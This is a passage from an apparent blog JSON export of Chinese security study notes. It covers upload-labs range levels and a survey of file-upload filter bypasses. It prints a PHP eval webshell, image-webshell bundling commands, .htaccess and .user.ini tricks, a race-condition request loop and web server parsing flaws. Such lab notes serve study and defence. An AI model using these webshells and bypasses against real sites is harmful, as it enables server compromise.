$this-resultUpload( $ret ); // if flag to check if the file exists is set to 1 if( $this-cls_file_exists == 1 ) $ret = $this-checkFileExists(); if( $ret != 1 ) return $this-resultUpload( $ret ); // if we are here, we are ready to move the file to destination $ret = $this-move(); if( $ret != 1 ) return $this-resultUpload( $ret ); // check if we need to rename the file if( $this-cls_rename_file == 1 ) $ret = $this-renameFile(); if( $ret != 1 ) return $this-resultUpload( $ret ); // if we are here, everything worked as planned :) return $this-resultUpload( SUCCESS ); .................. ; 同上一关,但是在上一关的基础上,对文件名进行修改,需要配合文件包含漏洞或其他漏洞绕过白名单过滤：利用apache的后缀名识别漏洞 —— 从右往左依次识别后缀，遇到不能识别的后缀名便跳过 ，因此可以文件名改为create.php.7z（.7z这个后缀apache不能识别） pass-20 源码 $is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) $deny_ext = array(php,php5,php4,php3,php2,html,htm,phtml,pht,jsp,jspa,jspx,jsw,jsv,jspf,jtml,asp,aspx,asa,asax,ascx,ashx,asmx,cer,swf,htaccess); $file_name = $_POST[save_name]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH . / .$file_name; if (move_uploaded_file($temp_file, $img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = 禁止保存为该类型文件！; else $msg = UPLOAD_PATH . 文件夹不存在,请手工创建！; 上传黑名单,会对文件名重命名,双写,大小写都可以绕过 pass-21 源码 $is_upload = false;$msg = null;if(!empty($_FILES[upload_file])) //检查MIME $allow_type = array(image/jpeg,image/png,image/gif); if(!in_array($_FILES[upload_file][type],$allow_type)) $msg = 禁止上传该类型文件!; else //检查文件名 $file = empty($_POST[save_name]) ? $_FILES[upload_file][name] : $_POST[save_name]; if (!is_array($file)) $file = explode(., strtolower($file)); $ext = end($file); $allow_suffix = array(jpg,png,gif); if (!in_array($ext, $allow_suffix)) $msg = 禁止上传该后缀文件!; else $file_name = reset($file) . . . $file[count($file) - 1]; $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH . / .$file_name; if (move_uploaded_file($temp_file, $img_path)) $msg = 文件上传成功！; $is_upload = true; else $msg = 文件上传失败！; else $msg = 请选择要上传的文件！; 上传检查MIME和白名单,以.切割为数组,取数组最后一个元素来校验是否在白名单内,再取数组数-1来重命名后缀","tags":["靶场日记"],"categories":["笔记","靶场日记"]},{"title":"文件上传绕过总结","path":"/2023/08/08/文件上传绕过总结/","content":"进行上传漏洞检查时，首先需要判断上传功能的代码是否对上传的文件进行了校验，如果没有任何校验即存在任意文件上传漏洞，但危险程度仍需进一步判断。（需要检查此处上传的文件是在本地还是在远端，是否存在脚本执行权限或环境支持等，现在很多程序会将附件上传到远端的OSS对象中存储。） 如果代码具有文件校验功能，接下来则需要验证文件校验代码是否完善，可以分别从前端和后端两个方面分析校验的完整性。 •前端校验：主要是分析JavaScript对上传文件的后缀名进行校验的完整性 •后端校验：主要是分析黑名单扩展名拦截、白名单扩展名拦截、HTTP Header的Content-Typ验证、文件头验证、二次渲染验证和文件名随机化等几个校验方法的完整性。 总结审计要点：寻找上传点，检查后缀名是否可自定义，若设置防御，是否可绕过；文件内容是否有校验，校验是否可绕过；是否检查了文件类型；文件上传路径是否可控；文件目录是否要求禁止脚本解析等。 客户端校验绕过一般都是在网页上写一段 javascript 脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg.jpeg.png后缀名的文件，而此时并没有发送数据包。 前端检测的绕过方法十分简单，这里就不详细展开讲解了。绕过方法有如下几种： 1.通过禁用 IE 中 JS 脚本； 2.通过元素审查修改代码（如删除 onsubmit”return checkFile()” 事件）； 3.通过元素审查 javascirpt 脚本中添加上传文件类型； 4.通过利用 burp 抓包改包，先上传一个 png 类型的木马，然后通过 burp 将其改为aspphpjsp 后缀名即可 注意：这里修改文件名字后，请求头中的 Content-Length 的值也要改（burp默认会自动修改）。 服务端黑名单校验绕过扩展名黑名单绕过黑名单检测：一般有个专门的 blacklist 文件，或者黑名单数组，里面会包含常见的危险脚本文件扩展名。 绕过方法： •找黑名单扩展名的漏网之鱼：比如 iis6.0 中的 asa 和 cer •可能存在大小写绕过漏洞：比如 aSp(iis6.0 中可以）和 pHp（只能在小于 php5.3.39 中的 linux 中）之中 •能被web容器解析的文件其他扩展名列表： 语言 可解析后缀 ASPASPX asp，aspx，asa，ascx，ashx，asmx，cer，cdx PHP php，php5，php4，php3，phtml，pht JSP jsp，jspx，jspa，jsw，jsv，jspf，jtml 上传.htaccess文件绕过.htaccess文件的作用： .htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。 .htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止允许特定IPIP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。 .htaccess的用途范围主要针对当前目录。 FilesMatch shell.jpgSetHandler application/x-httpd-php/FilesMatch 这个文件里面的含义就是将shell.jpg文件解析为php然后直接上传图片马,就可以解析为php .htaccess的使用技巧可以参考下面这篇文章： https://blog.csdn.net/solitudi/article/details/116666720 上传.user.ini文件绕过.user.ini。它比.htaccess用的更广，不管是nginxapacheIIS，只要是以fastcgi运行的php都可以用这个方法。 php.ini 是 php的配置文件，.user.ini 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。但是想要引发 .user.ini 解析漏洞需要三个前提条件 1. font style=color:rgb(63, 63, 63);服务器脚本语言为PHP/font 2. font style=color:rgb(63, 63, 63);服务器使用CGI／FastCGI模式/font 3. font style=color:rgb(63, 63, 63);上传目录下要有可执行的php文件/font 配合图片马隐藏个后门，这个方式是最方便的。 首先上传.user.ini文件，文件内容为： GIF89aauto_prepend_file=shell.png 然后构造一个shell.php，内容如下： script language=php @eval($_POST[c]); /script 然后将两个文件分别上传到服务器上，拿到回显： 利用大小写绕过Windows对大小写不敏感，Linux对大小写敏感。所以Windows系统可以解析.Php、.PHp、.PHP、.pHp、.pHP、.phP扩展名的文件。若网站后端过滤并未统一大小写（将文件扩展名转为小写表示），则会造成绕过。 利用空格绕过Windows系统文件后缀加空格命名之后是默认自动删除空格。若网站后端过滤时没有过滤空格，便可进行绕过。 利用点绕过同空格绕过原理一样，主要原因是Windows等系统默认删除文件后缀的“.”和空格。若网站后端过滤时没有过滤末尾的点，便可进行绕过。 利用NTFS流::$DATA绕过在Windows中如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名 例如：phpinfo.php::$DATAWindows会自动去掉末尾的::$DATA变成phpinfo.php 注：这是NTFS文件系统具有的特性，FAT32文件系统无法利用 利用点与空过滤绕过若后端代码只对上传文件进行简单过滤处理就直接将文件名拼接到上传路径中，那么我们可以反过来利用这些过滤处理，得到我们想要上传的文件。 利用扩展名双写绕过PHP后端使用str_ireplace这个函数将php，php5，php4等后缀变成空格，且只执行了一次，所以可以尝试构造文件后缀为pphphp绕过。 服务端白名单检验绕过利用00截断绕过0x00，%00，00之类的截断，都是一样的，只是不同表示而已。 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，所以当url中出现%00时就会认为读取已结束。 00截断的使用限制： •php版本小于5.3.4 •php.ini的magic_quotes_gpc为OFF状态•post方式上传文件名时需要在二进制中进行修改 MIME类型(Content-Type)检验绕过Content-Type（MediaType），即是Internet Media Type，互联网媒体类型，也叫做MIME类型。在互联网中有成百上千中不同的数据类型，HTTP在传输数据对象时会为他们打上称为MIME的数据格式标签，用于区分数据类型。最初MIME是用于电子邮件系统的，后来HTTP也采用了这一方案。在HTTP协议消息头中，使用Content-Type来表示请求和响应中的媒体类型信息。它用来告诉服务端如何处理请求的数据，以及告诉客户端（一般是浏览器）如何解析响应的数据，比如显示图片，解析并展示html等等。 上传WebShell，使用BurpSuite抓包，修改content-type绕过 常见的媒体格式类型如下：text/html：HTML格式text/plain：纯文本格式text/xml：XML格式text/css：CSS格式text/javascript：JS格式image/gif：GIF图片格式image/jpeg：JPG图片格式image/png：PNG图片格式•image/svg+xml：SVG矢量图格式video/mpeg：MPEG动画格式application/xhtml+xml：XHTML格式application/xml：XML数据格式application/json：JSON数据格式application/atom+xml：Atom+XML聚合格式application/pdf：PDF文档格式application/msword：Word文档格式application/octet-stream：二进制数据流（如常见的文件下载）application/x-www-form-urlencoded：form表单被编码成key/value格式发送到服务器（表单默认提交数据的格式）multipart/form-data：POST 提交时伴随文件上传的表单 文件头内容检验绕过不同的图片文件都有不同文件头。上传文件的时候会检查上传文件是否合法，如GIF图片文件是否文件头含有 gif89，可以通过编辑器在WebShell内容基础上再加了一些文件信息，有点像下面的结构： GIF89a ?php phpinfo(); ? 或者使用MS_DOS命令制作图片木马： copy normal.jpg /b + shell.php /a webshell.jpg 成功上传后需要配合文件包含漏洞才可执行代码 二次渲染绕过二次渲染：就是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。这里，也就是说，我们上传的图像，会被网站作为样品再生成一个新的图像，并且将我们原本上传的文件删除。 这里以gif图片示例 使用copy命令将webshell与正常图片进行捆绑： copy load.gif + shell.php shell.gif 上传图片后下载渲染后的图片 关于绕过gif的二次渲染，我们只需要找到渲染前后没有变化的位置，然后将php代码写进去，就可以成功上传带有php代码的图片了。 对比两张图片的16进制（这里使用的是Notepad++的HEX-Editor插件），白色区域是不变的部分，而红色区域是不同的部分。 我们将代码写到白色区域中： 上传图片，与图片马相同 需文件包含条件 注：PNG与JPG格式的二次渲染绕过就没有那么简单了，详细分析过程可以参考如下文章： https://xz.aliyun.com/t/2657#toc-6 条件竞争绕过条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同的请求时是并发进行的，因此如果并发处理不当或相关操作顺序设计的不合理时，将会导致此类问题的发生。因此条件竞争漏洞也称并发漏洞。条件也属于逻辑漏洞的范畴，这里将利用条件竞争漏洞绕过文件上传。 当上传文件后服务端将文件重命名文件名和后缀时可以尝试 文件上传,再被校验中间是有一个过程的,如果我们在上传后立即访问,占用文件,文件在被使用状态是不可被删除重命名的 利用burp重复发包，数据包内容为shell,不设置payload 然后利用脚本去重复访问上传的webshell路径 import requestswhile True: resp = requests.get(url=http://10.20.146.195/upload/shell.php) if resp.status_code == 200: print(攻击成功) break else: continue 解析漏洞绕过解析漏洞指的是服务器应用程序在解析某些精心构造的后缀文件时，会将其解析成网页脚本，从而导致网站的沦陷。大部分解析漏洞的产生都是由应用程序本身的漏洞导致的。 解析漏洞常见于IIS、Apache、Nginx这类的中间件对应版本存在的解析问题，存在的问题都在于中间件。 Apache解析漏洞影响版本：Apache 1.x、Apache 2.x Apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar、gif等扩展名是Apache不能识别的，因此就会直接将类型识别为php，从而达到了上传php代码的目的。 假如上传文件1.php.bb.rar，后缀名rar不认识，向前解析；1.php.bb，后缀名bb不认识，向前解析；1.php 最终解析结果为php文件。如果解析完还没有碰到可以解析的扩展名，就会暴露源文件。 IIS 5.x-6.x解析漏洞影响版本：IIS 5.x、IIS 6.x 使用 IIS5.x-6.x 版本的服务器，大多为Windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，不能解析aspx文件。 目录解析漏洞IIS 6.0中的目录解析漏洞，如果网站目录中有一个 *.asp的文件夹，那么该文件夹下面的一切内容都会被 IIS 当作 asp 脚本来执行，如xx.aspxx.jpg。 文件解析漏洞IIS 6.0中的分号（;）漏洞，IIS在解析文件名的时候会将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg。 解析文件类型IIS6.0 默认的可执行文件除了asp还包含这三种 : •test.asa •test.cer •test.cdx IIS 7.0IIS 7.5Nginx 8.03 畸形解析漏洞影响版本：IIS 7.0、IIS 7.5 IIS 7.07.5，默认 Fast-CGI 开启。如果直接在 url 中图片地址（.jpg）后面输入.php，会把正常图片解析为 php 文件。 在某些使用Nginx的网站中，访问http://www.xxser.com/1.jpg/1.php，1.jpg会被当作PHP脚本来解解析文件类型析，此时1.php是不存在的。这就意味着攻击者可以上传合法的“图片”（图片木马），然后在URL后面加上“xxx.php”，就可以获得网站的WebShell。 这不是Nginx特有的漏洞，在IIS 7.0、IIS 7.5、Lighttpd等Web容器中也经常会出现这样的解析漏洞。这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。 Nginx空字节解析漏洞影响版本：Nginx 0.5、0.6、0.70.7.65、0.8 0.8.37 在Fast-CGI关闭的情况下，Nginx 0.8.37 依然存在解析漏洞： 当Fast-CGI执行php时，在一个文件路径(xx.jpg)后面加上%00.php会将 xx.jpg%00.php 解析为 php 文件。 •www.xxxx.com/UploadFiles/image/1.jpg/1.php •www.xxxx.com/UploadFiles/image/1.jpg%00.php •www.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php","tags":["靶场日记"],"categories":["笔记","靶场日记"]}]